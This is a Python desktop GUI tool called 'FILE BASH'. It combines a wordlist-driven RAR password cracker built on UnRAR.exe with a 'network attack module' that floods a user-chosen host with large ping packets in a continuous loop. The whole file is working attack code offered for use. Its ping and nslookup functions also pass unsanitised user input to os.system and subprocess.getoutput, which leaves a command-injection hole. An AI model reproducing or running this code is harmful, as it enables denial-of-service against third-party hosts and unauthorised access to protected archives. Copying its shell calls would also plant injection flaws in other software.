import customtkinter as ctk
from tkinter import filedialog, messagebox
import subprocess
import os
import threading
import time

# Global styling
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class FileBashUSB(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("FILE BASH v.1 © | Integrated Suite")
        self.geometry("900x600")

        # Sidebar Navigation
        self.sidebar = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        
        self.logo_label = ctk.CTkLabel(self.sidebar, text="FILE BASH", font=("Orbitron", 24, "bold"), text_color="#00fbff")
        self.logo_label.pack(pady=20)

        self.btn_nav_decrypt = ctk.CTkButton(self.sidebar, text="USB DECRYPTOR", command=self.show_decryptor)
        self.btn_nav_decrypt.pack(pady=10, padx=20)

        self.btn_nav_net = ctk.CTkButton(self.sidebar, text="NETWORK MODULE", command=self.show_network)
        self.btn_nav_net.pack(pady=10, padx=20)

        # Main Container
        self.container = ctk.CTkFrame(self)
        self.container.pack(side="right", fill="both", expand=True, padx=20, pady=20)

        # Initialize Frames
        self.decrypt_frame = ctk.CTkFrame(self.container, fg_color="transparent")
        self.net_frame = ctk.CTkFrame(self.container, fg_color="transparent")
        
        self.setup_decryptor_ui()
        self.setup_network_ui()
        
        self.show_decryptor() # Default view

    # --- UI SETUP ---

    def setup_decryptor_ui(self):
        header = ctk.CTkLabel(self.decrypt_frame, text="USB EXTERNAL DECRYPTOR", font=("Arial", 16, "bold"))
        header.pack(pady=10)

        self.target_path = ctk.StringVar(value="PATH: [NOT SELECTED]")
        ctk.CTkLabel(self.decrypt_frame, textvariable=self.target_path).pack()
        ctk.CTkButton(self.decrypt_frame, text="MOUNT TARGET FILE", command=self.pick_target).pack(pady=5)

        self.wordlist_path = ctk.StringVar(value="LIST: [NOT SELECTED]")
        ctk.CTkLabel(self.decrypt_frame, textvariable=self.wordlist_path).pack()
        ctk.CTkButton(self.decrypt_frame, text="LOAD DICTIONARY", command=self.pick_wordlist).pack(pady=5)

        self.console = ctk.CTkTextbox(self.decrypt_frame, height=200, font=("Consolas", 12), fg_color="#000", text_color="#00ff00")
        self.console.pack(padx=20, pady=20, fill="both", expand=True)
        
        self.progress = ctk.CTkProgressBar(self.decrypt_frame, mode="indeterminate")
        self.progress.pack(fill="x", padx=20)
        self.progress.set(0)

        ctk.CTkButton(self.decrypt_frame, text="INITIALIZE BASH", fg_color="#00fbff", text_color="#000", command=self.start_decrypt_thread).pack(pady=20)

    def setup_network_ui(self):
        ctk.CTkLabel(self.net_frame, text="NETWORK ATTACK MODULE", font=("Arial", 16, "bold"), text_color="#ff4444").pack(pady=10)
        
        self.net_ip = ctk.CTkEntry(self.net_frame, placeholder_text="Target IP / Host")
        self.net_ip.pack(pady=5)
        
        self.net_packet = ctk.CTkEntry(self.net_frame, placeholder_text="Packet Size (max 65500)")
        self.net_packet.pack(pady=5)

        btn_box = ctk.CTkFrame(self.net_frame, fg_color="transparent")
        btn_box.pack(pady=10)

        ctk.CTkButton(btn_box, text="CHECK CONNECTION", command=self.ping_target, width=150).grid(row=0, column=0, padx=5)
        ctk.CTkButton(btn_box, text="NSLOOKUP", command=self.nslookup_target, width=150).grid(row=0, column=1, padx=5)
        
        self.net_console = ctk.CTkTextbox(self.net_frame, height=200, fg_color="#000", text_color="#00ff00")
        self.net_console.pack(padx=20, pady=10, fill="both", expand=True)

        self.btn_attack = ctk.CTkButton(self.net_frame, text="START ATTACK", fg_color="#ff4444", command=self.toggle_attack)
        self.btn_attack.pack(pady=10)
        
        self.attacking = False

    # --- NAVIGATION ---

    def show_decryptor(self):
        self.net_frame.pack_forget()
        self.decrypt_frame.pack(fill="both", expand=True)

    def show_network(self):
        self.decrypt_frame.pack_forget()
        self.net_frame.pack(fill="both", expand=True)

    # --- LOGIC ---

    def log_net(self, msg):
        self.net_console.insert("end", f"> {msg}\n")
        self.net_console.see("end")

    def ping_target(self):
        target = self.net_ip.get()
        if not target: return
        res = os.system(f"ping -n 1 {target}")
        status = "ONLINE" if res == 0 else "OFFLINE"
        self.log_net(f"Target {target} is {status}")

    def nslookup_target(self):
        target = self.net_ip.get()
        if not target: return
        output = subprocess.getoutput(f"nslookup {target}")
        self.log_net(output)

    def toggle_attack(self):
        if not self.attacking:
            self.attacking = True
            self.btn_attack.configure(text="STOP ATTACK", fg_color="gray")
            threading.Thread(target=self.run_attack, daemon=True).start()
        else:
            self.attacking = False
            self.btn_attack.configure(text="START ATTACK", fg_color="#ff4444")

    def run_attack(self):
        target = self.net_ip.get()
        size = self.net_packet.get() or "64"
        while self.attacking:
            # Replicating the batch file's ping attack
            subprocess.run(["ping", target, "-l", size, "-n", "1"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.log_net(f"Packet sent to {target} size={size}")
            time.sleep(0.1)

    # (Retaining original Decryptor Logic)
    def pick_target(self):
        path = filedialog.askopenfilename()
        if path: self.target_path.set(f"PATH: {path}")

    def pick_wordlist(self):
        path = filedialog.askopenfilename()
        if path: self.wordlist_path.set(f"LIST: {path}")

    def start_decrypt_thread(self):
        t = threading.Thread(target=self.execute_bash, daemon=True)
        t.start()

    def execute_bash(self):
        target = self.target_path.get().replace("PATH: ", "")
        words = self.wordlist_path.get().replace("LIST: ", "")
        unrar = r"C:\Program Files\WinRAR\UnRAR.exe"
        
        if not os.path.exists(unrar):
            messagebox.showerror("ERROR", "UnRAR.exe not found.")
            return

        self.progress.start()
        with open(words, 'r', errors='ignore') as f:
            for count, line in enumerate(f, 1):
                pwd = line.strip()
                result = subprocess.run([unrar, "t", "-p" + pwd, "-y", target], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if count % 5 == 0: self.console.insert("end", f"> Testing: {pwd}\n"); self.console.see("end")
                if result.returncode == 0:
                    self.progress.stop()
                    messagebox.showinfo("SUCCESS", f"Found: {pwd}")
                    return
        self.progress.stop()

if __name__ == "__main__":
    app = FileBashUSB()
    app.mainloop()

